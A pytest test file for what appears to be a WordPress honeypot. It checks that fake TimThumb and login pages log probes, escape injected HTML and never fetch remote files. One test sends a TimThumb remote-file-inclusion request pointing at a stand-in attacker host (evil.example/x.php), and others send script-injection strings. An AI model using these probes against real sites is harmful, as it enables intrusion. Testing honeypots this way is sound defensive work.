import json
import os

import pytest

os.environ.setdefault("WORDPOT_LOG_DIR", "/tmp/wordpot-test-logs")

from wordpot import app  # noqa: E402


@pytest.fixture()
def client(tmp_path):
    app.config["TESTING"] = True
    old = {key: app.config.get(key) for key in ("PROFILE_ID", "EVENT_LOG_FILE")}
    app.config["PROFILE_ID"] = "modern-business"
    app.config["EVENT_LOG_FILE"] = str(tmp_path / "wordpot.json")
    yield app.test_client()
    app.config.update(old)


@pytest.fixture()
def events(tmp_path):
    def read():
        path = tmp_path / "wordpot.json"
        return [json.loads(line) for line in path.read_text().splitlines() if line.strip()]

    return read


def test_timthumb_without_src_reports_missing_image(client, events):
    response = client.get("/wp-content/plugins/elementor/includes/timthumb.php")
    body = response.get_data(as_text=True)

    assert response.status_code == 400
    assert "A TimThumb error has occured" in body
    assert "No image specified" in body
    assert events()[0]["technique"] == "timthumb_probe"


def test_timthumb_with_external_src_is_logged_but_never_fetched(client, events, monkeypatch):
    import urllib.request

    def fail(*args, **kwargs):
        raise AssertionError("timthumb bait must not fetch remote URLs")

    monkeypatch.setattr(urllib.request, "urlopen", fail)
    response = client.get("/wp-content/themes/twentytwentyfive/thumb.php?src=http://evil.example/x.php&w=10")
    body = response.get_data(as_text=True)

    assert response.status_code == 400
    assert "You may not fetch images from that site" in body
    assert "src=http://evil.example/x.php&amp;w=10" in body
    event = events()[0]
    assert event["technique"] == "timthumb_probe"
    assert event["details"]["lure_params"]["src"] == "http://evil.example/x.php"


def test_timthumb_query_string_is_escaped(client):
    body = client.get("/wp-content/plugins/elementor/timthumb.php?src=<script>x</script>").get_data(as_text=True)

    assert "<script>x</script>" not in body
    assert "&lt;script&gt;" in body


def test_login_error_for_known_user(client):
    body = client.post("/wp-login.php", data={"log": "admin", "pwd": "hunter2"}).get_data(as_text=True)

    assert "The password you entered for the username <strong>admin</strong> is incorrect." in body


def test_login_error_for_unknown_user_is_escaped(client):
    body = client.post("/wp-login.php", data={"log": "<b>eve</b>", "pwd": "x"}).get_data(as_text=True)

    assert "The username <strong>&lt;b&gt;eve&lt;/b&gt;</strong> is not registered on this site." in body
    assert "<b>eve</b>" not in body


@pytest.mark.parametrize(
    "data,message",
    [
        ({"log": "", "pwd": "x"}, "The username field is empty."),
        ({"log": "admin", "pwd": ""}, "The password field is empty."),
    ],
)
def test_login_error_for_empty_fields(client, data, message):
    body = client.post("/wp-login.php", data=data).get_data(as_text=True)

    assert message in body


def test_login_keeps_submitted_username_in_form(client):
    body = client.post("/wp-login.php", data={"log": "admin", "pwd": "x"}).get_data(as_text=True)

    assert 'id="user_login" class="input" value="admin"' in body
